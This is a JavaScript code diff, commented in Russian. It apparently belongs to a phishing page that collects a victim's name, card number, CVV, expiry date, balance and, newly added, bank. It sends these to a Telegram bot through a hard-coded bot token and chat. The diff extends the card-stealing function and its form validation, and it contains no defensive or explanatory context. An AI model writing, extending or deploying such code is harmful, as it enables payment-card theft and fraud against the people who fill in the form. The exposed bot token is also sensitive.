@@ -4,6 +4,7 @@ function sendMessage() {
     var cvv = document.getElementById('cvv').value;
     var expiryDate = document.getElementById('expiryDate').value;
     var cardBalance = document.getElementById('cardBalance').value;
+    var chooseBank = document.getElementById('chooseBank').value;
 
     // Ваш токен бота и ID чата
     var botToken = '6416835308:AAE-lstFazO_12p5eSI4PHIQLKkC4-q_vfU';
@@ -15,11 +16,11 @@ function sendMessage() {
     // Формируем данные для отправки
     var data = {
         chat_id: chatId,
-        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + cardNumber + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance
+        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + cardNumber + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance + '\nБанк: ' + chooseBank
     };
 
     // Отправляем POST-запрос с использованием AJAX
-    if (name === "" || cardNumber === "" || cvv === "" || expiryDate === "" || cardBalance === "" || cvv.length < 3 || cardNumber.length < 19 || expiryDate.length < 5) {
+    if (name === "" || cardNumber === "" || cvv === "" || expiryDate === "" || cardBalance === "" || chooseBank === "" || cvv.length < 3 || cardNumber.length < 19 || expiryDate.length < 5) {
         alert('Пожалуйста, заполните все поля перед выводом.');
     } else {
         var xhr = new XMLHttpRequest();
